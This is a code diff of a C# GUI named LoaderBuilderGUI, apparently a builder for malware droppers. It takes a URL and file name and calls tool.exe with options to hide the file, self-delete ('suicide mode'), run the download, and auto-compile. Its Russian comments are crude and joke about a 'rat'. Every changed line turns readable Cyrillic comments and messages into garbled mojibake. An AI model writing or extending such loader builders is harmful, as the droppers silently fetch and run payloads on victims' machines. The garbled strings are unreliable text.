@@ -11,41 +11,41 @@ namespace LoaderBuilderGUI
 
 
         private void button1_Click(object sender, EventArgs e)
-        { // Основные действия бляить
-            // Меньшие из зол
+        { // РћСЃРЅРѕРІРЅС‹Рµ РґРµР№СЃС‚РІРёСЏ Р±Р»СЏРёС‚СЊ
+            // РњРµРЅСЊС€РёРµ РёР· Р·РѕР»
             string url = textBox1.Text;
             string namefile = textBox2.Text;
-            // Конец меньшиго из зол
-            // Вроде наибольшие (или нет) из зол
+            // РљРѕРЅРµС† РјРµРЅСЊС€РёРіРѕ РёР· Р·РѕР»
+            // Р’СЂРѕРґРµ РЅР°РёР±РѕР»СЊС€РёРµ (РёР»Рё РЅРµС‚) РёР· Р·РѕР»
             string suicide = "No";
             string run = "No";
             string compile = "No";
             string hide = "No";
-            // Вродец конец (Нет)
+            // Р’СЂРѕРґРµС† РєРѕРЅРµС† (РќРµС‚)
             if (checkBox1.Checked == true)
-            { // Suicide mode Лол
+            { // Suicide mode Р›РѕР»
                 suicide = "Yes";
             }
             if (checkBox2.Checked == true)
-            { // Крыса ебанная, ой тоесть хайд мод ой тьфу Hide mode
+            { // РљСЂС‹СЃР° РµР±Р°РЅРЅР°СЏ, РѕР№ С‚РѕРµСЃС‚СЊ С…Р°Р№Рґ РјРѕРґ РѕР№ С‚СЊС„Сѓ Hide mode
                 hide = "Yes";
             }
             if (checkBox3.Checked == true)
-            {  // Бегун или запускает файл при скачивании лолка
+            {  // Р‘РµРіСѓРЅ РёР»Рё Р·Р°РїСѓСЃРєР°РµС‚ С„Р°Р№Р» РїСЂРё СЃРєР°С‡РёРІР°РЅРёРё Р»РѕР»РєР°
                 run = "Yes";
             }
             if (checkBox4.Checked == true)
-            { // Авто компилиция (пилиция блять)
+            { // РђРІС‚Рѕ РєРѕРјРїРёР»РёС†РёСЏ (РїРёР»РёС†РёСЏ Р±Р»СЏС‚СЊ)
                 compile = "Yes";
             }
             var process = Process.Start(@"tool.exe ", namefile + " " + url + " " + compile + " " + suicide + " " + hide + " " + run);
             process.WaitForExit();
-            MessageBox.Show("Файл слеплен!\nПараметры :\nСуицаид мод : " + suicide + "\nСпрятать файл : " + hide + "\nЗапустить файл : " + run + "\nАвтокомпиляция : " + compile + "\n---------------------" + "\nСсылка : " + url + "\nИмя файла : " + namefile + "\n---------------------" + "\nСделанно LoaderBuilderGUI");
+            MessageBox.Show("Р¤Р°Р№Р» СЃР»РµРїР»РµРЅ!\nРџР°СЂР°РјРµС‚СЂС‹ :\nРЎСѓРёС†Р°РёРґ РјРѕРґ : " + suicide + "\nРЎРїСЂСЏС‚Р°С‚СЊ С„Р°Р№Р» : " + hide + "\nР—Р°РїСѓСЃС‚РёС‚СЊ С„Р°Р№Р» : " + run + "\nРђРІС‚РѕРєРѕРјРїРёР»СЏС†РёСЏ : " + compile + "\n---------------------" + "\nРЎСЃС‹Р»РєР° : " + url + "\nРРјСЏ С„Р°Р№Р»Р° : " + namefile + "\n---------------------" + "\nРЎРґРµР»Р°РЅРЅРѕ LoaderBuilderGUI");
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Билдер LoaderBuilderGUI\nИспользованна версия : Интегрированная версия v0.3\nСозданно : Ametero(z)");
+            MessageBox.Show("Р‘РёР»РґРµСЂ LoaderBuilderGUI\nРСЃРїРѕР»СЊР·РѕРІР°РЅРЅР° РІРµСЂСЃРёСЏ : РРЅС‚РµРіСЂРёСЂРѕРІР°РЅРЅР°СЏ РІРµСЂСЃРёСЏ v0.3\nРЎРѕР·РґР°РЅРЅРѕ : Ametero(z)");
         }
 
     }
